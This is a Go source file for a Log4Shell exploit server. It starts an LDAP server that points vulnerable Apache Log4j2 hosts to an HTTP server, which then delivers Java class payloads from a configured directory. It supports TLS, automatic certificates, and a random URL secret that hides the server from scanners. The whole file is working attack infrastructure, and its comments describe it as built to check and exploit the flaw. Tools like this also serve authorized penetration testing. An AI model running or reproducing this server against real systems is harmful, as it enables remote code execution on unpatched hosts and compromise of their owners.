package log4shell

import (
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/For-ACGN/ldapserver"
	"github.com/pkg/errors"
)

// Config contains configurations about log4shell server.
type Config struct {
	LogOut io.Writer

	// Hostname can be set IP address or domain name,
	// If enable AutoCert, must set domain name.
	Hostname string

	// PayloadDir contains Java class files.
	PayloadDir string

	// about servers network and address.
	HTTPNetwork string
	HTTPAddress string
	LDAPNetwork string
	LDAPAddress string

	// AutoCert is used to ACME client to sign
	// certificate automatically, don't need to
	// set EnableTLS true again.
	AutoCert bool

	// EnableTLS is used to enable ldaps and
	// https server, must set TLS certificate.
	EnableTLS bool

	// TLSCert is used to for ldaps and https.
	TLSCert tls.Certificate
}

// Server is used to create an exploit server that contain
// a http server and ldap server(can wrap tls), it used to
// check and exploit Apache Log4j2 vulnerability easily.
type Server struct {
	logger    *log.Logger
	enableTLS bool

	secret string

	httpListener net.Listener
	httpHandler  *httpHandler
	httpServer   *http.Server

	ldapListener net.Listener
	ldapHandler  *ldapHandler
	ldapServer   *ldapserver.Server

	mu sync.Mutex
	wg sync.WaitGroup
}

// New is used to create a new log4shell server.
func New(cfg *Config) (*Server, error) {
	// check configuration
	if cfg.LogOut == nil {
		panic("log4shell: Config.LogOut can not be nil")
	}
	if cfg.Hostname == "" {
		return nil, errors.New("empty host name")
	}
	fi, err := os.Stat(cfg.PayloadDir)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	if !fi.IsDir() {
		return nil, errors.Errorf("\"%s\" is not a directory", cfg.PayloadDir)
	}

	// set logger
	logger := log.New(cfg.LogOut, "", log.LstdFlags)
	ldapserver.Logger = logger

	// initial tls config
	var tlsConfig *tls.Config
	enableTLS := cfg.EnableTLS
	if cfg.AutoCert {
		// hostname must be a domain name
		cert, err := autoSignCert(cfg.Hostname)
		if err != nil {
			return nil, err
		}
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{*cert},
		}
		enableTLS = true
	} else if enableTLS {
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{cfg.TLSCert},
		}
	}

	// generate random string and add it to the http handler
	// for prevent some http spider or exploit server scanner
	secret := randString(8)

	// initialize http server
	httpListener, err := net.Listen(cfg.HTTPNetwork, cfg.HTTPAddress)
	if err != nil {
		return nil, errors.Wrap(err, "failed to create http listener")
	}
	httpHandler := httpHandler{
		logger:     logger,
		payloadDir: cfg.PayloadDir,
		secret:     secret,
	}
	httpServer := http.Server{
		Handler:      &httpHandler,
		TLSConfig:    tlsConfig,
		ReadTimeout:  time.Minute,
		WriteTimeout: time.Minute,
		IdleTimeout:  time.Minute,
		ErrorLog:     logger,
	}

	// initialize ldap server
	ldapListener, err := net.Listen(cfg.LDAPNetwork, cfg.LDAPAddress)
	if err != nil {
		return nil, errors.Wrap(err, "failed to create ldap listener")
	}
	var scheme string
	if enableTLS {
		scheme = "https"
	} else {
		scheme = "http"
	}
	_, port, err := net.SplitHostPort(httpListener.Addr().String())
	if err != nil {
		return nil, errors.WithStack(err)
	}
	addr := net.JoinHostPort(cfg.Hostname, port)
	url := fmt.Sprintf("%s://%s/%s/", scheme, addr, secret)
	ldapHandler := ldapHandler{
		logger: logger,
		url:    url,
	}
	ldapRoute := ldapserver.NewRouteMux()
	ldapRoute.Bind(ldapHandler.handleBind)
	ldapRoute.Search(ldapHandler.handleSearch)
	ldapServer := ldapserver.NewServer()
	ldapServer.Handle(ldapRoute)
	ldapServer.TLSConfig = tlsConfig
	ldapServer.ReadTimeout = time.Minute
	ldapServer.WriteTimeout = time.Minute

	// create log4shell server
	server := Server{
		logger:       logger,
		enableTLS:    enableTLS,
		secret:       secret,
		httpListener: httpListener,
		httpHandler:  &httpHandler,
		httpServer:   &httpServer,
		ldapListener: ldapListener,
		ldapHandler:  &ldapHandler,
		ldapServer:   ldapServer,
	}
	return &server, nil
}

// Start is used to start log4shell server.
func (srv *Server) Start() error {
	srv.mu.Lock()
	defer srv.mu.Unlock()

	errCh := make(chan error, 2)

	// start http server
	srv.wg.Add(1)
	go func() {
		defer srv.wg.Done()
		var err error
		if srv.enableTLS {
			err = srv.httpServer.ServeTLS(srv.httpListener, "", "")
		} else {
			err = srv.httpServer.Serve(srv.httpListener)
		}
		errCh <- err
	}()

	// start ldap server
	srv.wg.Add(1)
	go func() {
		defer srv.wg.Done()
		var err error
		if srv.enableTLS {
			err = srv.ldapServer.ServeTLS(srv.ldapListener)
		} else {
			err = srv.ldapServer.Serve(srv.ldapListener)
		}
		errCh <- err
	}()

	select {
	case err := <-errCh:
		return err
	case <-time.After(250 * time.Millisecond):
	}

	if srv.enableTLS {
		srv.logger.Println("[info]", "start https server", srv.httpListener.Addr())
		srv.logger.Println("[info]", "start ldaps server", srv.ldapListener.Addr())
	} else {
		srv.logger.Println("[info]", "start http server", srv.httpListener.Addr())
		srv.logger.Println("[info]", "start ldap server", srv.ldapListener.Addr())
	}
	srv.logger.Println("[info]", "start log4shell server successfully")
	return nil
}

// Stop is used to stop log4shell server.
func (srv *Server) Stop() error {
	srv.mu.Lock()
	defer srv.mu.Unlock()

	// close ldap server
	srv.ldapServer.Stop()
	srv.logger.Println("[info]", "ldap server is stopped")

	// close http server
	err := srv.httpServer.Close()
	if err != nil {
		return errors.Wrap(err, "failed to close http server")
	}
	srv.logger.Println("[info]", "http server is stopped")

	srv.wg.Wait()
	srv.logger.Println("[info]", "log4shell server is stopped")
	return nil
}

// Secret is used to get the generated secret about url.
func (srv *Server) Secret() string {
	return srv.secret
}
